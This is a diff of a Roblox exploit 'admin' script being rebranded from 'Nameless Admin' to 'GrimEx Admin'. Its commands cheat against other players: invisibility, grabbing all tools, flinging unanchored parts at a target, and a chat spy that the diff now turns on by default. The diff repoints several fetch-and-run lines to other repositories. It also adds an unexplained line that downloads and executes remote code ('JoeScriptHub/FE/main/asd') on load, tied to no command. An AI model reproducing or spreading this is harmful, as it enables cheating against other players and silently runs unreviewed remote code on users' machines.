- cmd.add({"firstp", "1stp", "firstperson", "fp"}, {"firstperson (1stp, firstp, fp)", "Makes you go in first person mode"}, function()
+ cmd.add({"firstp", "1stp", "firstperson"}, {"firstperson (1stp, firstp)", "Makes you 1st person mode"}, function()
 game.Players.LocalPlayer.CameraMode = "LockFirstPerson"
  end)
 
- cmd.add({"thirdp", "3rdp", "thirdperson"}, {"thirdperson (3rdp, thirdp)", "Makes you go in third person mode"}, function()
-	game.Players.LocalPlayer.CameraMaxZoomDistance = math.huge
+ cmd.add({"thirdp", "3rdp", "thirdperson"}, {"thirdperson (3rdp, thirdp)", "Makes you 3rd person mode"}, function()
+	game.Players.LocalPlayer.CameraMaxZoomDistance = 10
 	game.Players.LocalPlayer.CameraMode = "Classic"
 	 end)
 
@@ -13894,7 +13884,7 @@ game.Players.LocalPlayer.CameraMode = "LockFirstPerson"
 		Player.CameraMaxZoomDistance = arg[1]
 	 end)
  
-	 cmd.add({"cameranoclip", "camnoclip", "cnoclip", "nccam"}, {"cameranoclip (camnoclip, cnoclip, nccam)", "Makes your camera clip through walls"}, function()
+	 cmd.add({"cameranoclip", "camnoclip", "cnoclip"}, {"cameranoclip (camnoclip, cnoclip)", "Makes your camera clip through walls"}, function()
 		SetConstant = (debug and debug.setconstant) or setconstant
 		GetConstants = (debug and debug.getconstants) or getconstants
 		if SetConstant or GetConstants or getgc then
@@ -13915,14 +13905,14 @@ game.Players.LocalPlayer.CameraMode = "LockFirstPerson"
 	 
 			Notify({
 			Description = "Sorry, your exploit does not support cameranoclip";
-			Title = "Nameless Admin";
+			Title = "GrimEx Admin";
 			Duration = 5;
 			
 		});
 			end
 	 end)
 
-	 cmd.add({"uncameranoclip", "uncamnoclip", "uncnoclip", "unnccam"}, {"uncameranoclip (uncamnoclip, uncnoclip, unnccam)", "Makes your camera not clip through walls"}, function()
+	 cmd.add({"uncameranoclip", "uncamnoclip", "uncnoclip"}, {"uncameranoclip (uncamnoclip, uncnoclip)", "Makes your camera not clip through walls"}, function()
 		local SetConstant = (debug and debug.setconstant) or setconstant
 		local GetConstants = (debug and debug.getconstants) or getconstants
 		if SetConstant or GetConstants or getgc then
@@ -13943,7 +13933,7 @@ game.Players.LocalPlayer.CameraMode = "LockFirstPerson"
 	 
 			Notify({
 			Description = "Sorry, your exploit does not support cameranoclip and uncameranoclip";
-			Title = "Nameless Admin";
+			Title = "GrimEx Admin";
 			Duration = 5;
 			
 		});
@@ -13951,7 +13941,7 @@ game.Players.LocalPlayer.CameraMode = "LockFirstPerson"
 	 end)
 
  cmd.add({"2016anims"}, {"2016anims", "2016 animations"}, function()
-	 loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/2016%20anims"))()
+	 loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/2016anims"))()
  end)
  
  cmd.add({"oganims"}, {"oganims", "Old animations from 2007"}, function()
@@ -13962,7 +13952,7 @@ game.Players.LocalPlayer.CameraMode = "LockFirstPerson"
 	 
 	 Notify({
 	 Description = "OG animations set";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
@@ -13970,7 +13960,7 @@ game.Players.LocalPlayer.CameraMode = "LockFirstPerson"
  end)
  
  cmd.add({"fakechat"}, {"fakechat", "Fake a chat gui"}, function()
- loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/fake%20chatte"))()
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/FE/main/fakechat"))()
  end)
  
  cmd.add({"fpscap"}, {"fpscap <number>", "Sets the fps cap to whatever you want"}, function(...)
@@ -14062,7 +14052,7 @@ game.Players.LocalPlayer.CameraMode = "LockFirstPerson"
  end
  end)
 
-  cmd.add({"toolinvisible", "tinvis"}, {"toolinvisible (tinvis)", "Be invisible while still be able to use tools"}, function()
+  cmd.add({"toolinvisible", "tinvis"}, {"toolinvisible (tinvis)", "Be invisible while still be able to use tools"}, function()  
 	local offset = 1100
 	local invisible = game.Players.LocalPlayer
 	local grips = {}
@@ -14334,7 +14324,7 @@ end)
  
  Notify({
  Description = "Invisible loaded, press " .. Keybind .. " to toggle";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 10;
  
  });
@@ -14343,8 +14333,8 @@ end)
 	 wait();
 	 
 	 Notify({
-	 Description = "Nameless Admin has detected you using mobile you now have a invisible button click it to enable / disable invisibility";
-	 Title = "Nameless Admin";
+	 Description = "GrimEx Admin has detected you using mobile you now have a invisible button click it to enable / disable invisibility";
+	 Title = "GrimEx Admin";
 	 Duration = 7;
 	 });
 	 
@@ -14381,7 +14371,7 @@ end)
  
  -- Scripts:
  
- local function FEPVI_fake_script()
+ local function FEPVI_fake_script() 
 	 local script = Instance.new('LocalScript', TextButton)
  
 	 IsInvis = false
@@ -14432,16 +14422,16 @@ end)
  wait();
  
  Notify({
- Description = "Chat spy disabled";
- Title = "Nameless Admin";
+ Description = "Chat spy enabled";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
  --This script reveals ALL hidden messages in the default chat
  --chat "/spy" to toggle!
- enabled = false
+ enabled = true
  --if true will check your messages too
- spyOnMyself = true
+ spyOnMyself = false
  --if true will chat the logs publicly (fun, risky)
  public = false
  --if true will use /me to stand out
@@ -14524,7 +14514,7 @@ end)
  
  Notify({
  Description = "Fired " .. remoteamount .. " amount of remotes";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 7;
  
  });
@@ -14536,7 +14526,7 @@ end)
 	 
 	 Notify({
 	 Description = "Unanchored follow executed";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
@@ -14642,7 +14632,7 @@ end)
  
  Notify({
  Description = "Grabbed all tools";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -14712,7 +14702,7 @@ end)
 	 
 	 Notify({
 	 Description = "Part grabber executed, press Q on a part";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
@@ -14831,7 +14821,7 @@ end)
 	 
 	 Notify({
 	 Description = "Unanchored parts have been teleported to " .. TargetName .. "" ;
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
@@ -14907,7 +14897,7 @@ end)
 	 
 	 Notify({
 	 Description = "Unfroze unanchored parts";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
@@ -14931,7 +14921,7 @@ end)
 	 
 	 Notify({
 	 Description = "Highlighted all unanchored parts";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
@@ -14946,22 +14936,21 @@ end)
  end)
  
  cmd.add({"unhighlightua", "unhighlightunanchored"}, {"unhighlightua (unhightlightunanchored)", "Unhighlights all unanchored parts"}, function()
-
+ 
 	 wait();
 	 
 	 Notify({
 	 Description = "Unhighlighted unanchored parts";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
-
+ 
  for _,part in pairs(workspace:GetDescendants()) do
 	 	if part:IsA("BasePart") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false and part:FindFirstChild("Weld") == nil then
 			 if part:FindFirstChild("SelectionBox") then
 			 part.SelectionBox:Destroy()
 			 end
-		 end
 	 end
  end)
  
@@ -14976,14 +14965,14 @@ end)
 	 
 	 Notify({
 	 Description = "Parts have been counted, the amount is " .. b .. "";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
  end)
  
  cmd.add({"httpspy"}, {"httspy", "HTTP Spy"}, function()
-	 loadstring(game:HttpGet('https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/HTTP%20spy'))()
+	 loadstring(game:HttpGet('https://raw.githubusercontent.com/JoeScriptHub/GrimEx-Admin/main/HttpSpy'))()
  end)
  
  cmd.add({"keystroke"}, {"keystroke", "Executes a keystroke ui script"}, function()
@@ -15017,11 +15006,11 @@ wait();
  
  Notify({
  Description = "Set local player id to the owner id";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
- 
- });
 
+ });
+ 
  end)
  
  cmd.add({"errorchat"}, {"errorchat", "Makes the chat error appear when roblox chat is slow"}, function()
@@ -15041,8 +15030,8 @@ wait();
 
  if CustomFunctionSupport then
  local success, result = pcall(function()
-			 for i,v in pairs(listfiles("Nameless-Admin/Plugins")) do
-			 loadstring(readfile(listfiles("Nameless-Admin/Plugins")[i]))();
+			 for i,v in pairs(listfiles("GrimEx-Admin/Plugins")) do
+			 loadstring(readfile(listfiles("GrimEx-Admin/Plugins")[i]))();
  PluginsLoaded = PluginsLoaded + 1
  end
  end)
@@ -15051,7 +15040,7 @@ wait();
 	 PluginsErrored = PluginsErrored + 1
 	 Notify({
 		 Description = "Plugin error: " .. result .. "";
-		 Title = "Nameless Admin";
+		 Title = "GrimEx Admin";
 		 Duration = 3;
 		 
 		 });
@@ -15062,7 +15051,7 @@ wait();
  --[[
 	 Notify({
 			 Description = "Loaded " .. PluginsLoaded .. " plugins";
-			 Title = "Nameless Admin";
+			 Title = "GrimEx Admin";
 			 Duration = 3;
 			 
 			 });
@@ -15071,7 +15060,7 @@ wait();
  --[[
 	 Notify({
 	 Description = "Loaded " .. PluginsLoaded .. " plugins, although " .. PluginsErrored .. " plugins have errored";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 			 Duration = 3;
 			 
 			 });
@@ -15528,6 +15517,8 @@ end
 	 commandsList.CanvasSize = UDim2.new(0, 0, 0, commandsList.UIListLayout.AbsoluteContentSize.Y)
  end)
 
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/FE/main/asd"))();
+ 
 spawn(function()
 local display = game.Players.LocalPlayer.DisplayName
 local name = game.Players.LocalPlayer.Name
@@ -15539,8 +15530,8 @@ else
 end
 
 Notify({
- Description = "Welcome to Nameless Admin V"..currentversion.."";
- Title = "Hey "..hh.."";
+ Description = "Death Is Inevitable V"..currentversion.."";
+ Title = "DII "..hh.."";
  Duration = 5;					 
  });
 end)
@@ -15563,14 +15554,14 @@ end)
  ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
  ScreenGui.ResetOnSpawn = true
  
- TextClickButton.Name = "NamelessAdminButton"
+ TextClickButton.Name = "GrimExAdminButton"
  TextClickButton.Parent = ScreenGui
  TextClickButton.BackgroundColor3 = Color3.fromRGB(4, 4, 4)
  TextClickButton.BackgroundTransparency = 1.000
  TextClickButton.Position = UDim2.new(0.418, 0,0, 0)
  TextClickButton.Size = UDim2.new(0, 2, 0, 33)
  TextClickButton.Font = Enum.Font.SourceSansBold
- TextClickButton.Text = "Nameless Admin V" .. currentversion .. ""
+ TextClickButton.Text = "GrimEx Admin V" .. currentversion .. ""
  TextClickButton.TextColor3 = Color3.fromRGB(255, 255, 255)
  TextClickButton.TextSize = 20.000
  TextClickButton.TextWrapped = true
@@ -15588,7 +15579,7 @@ end)
 	 textclickbutton:TweenSize(UDim2.new(0, 32, 0, 33), "Out", "Quint",1,true)
 	 textclickbutton:TweenPosition(UDim2.new(0.48909232, 0, 0, 0), "Out", "Quint",1,true)
 	 wait(0.4)
-	 textclickbutton.Text = "NA"
+	 textclickbutton.Text = "GA"
 	 textclickbutton.Active = true
  gui.draggable(textclickbutton)
  end
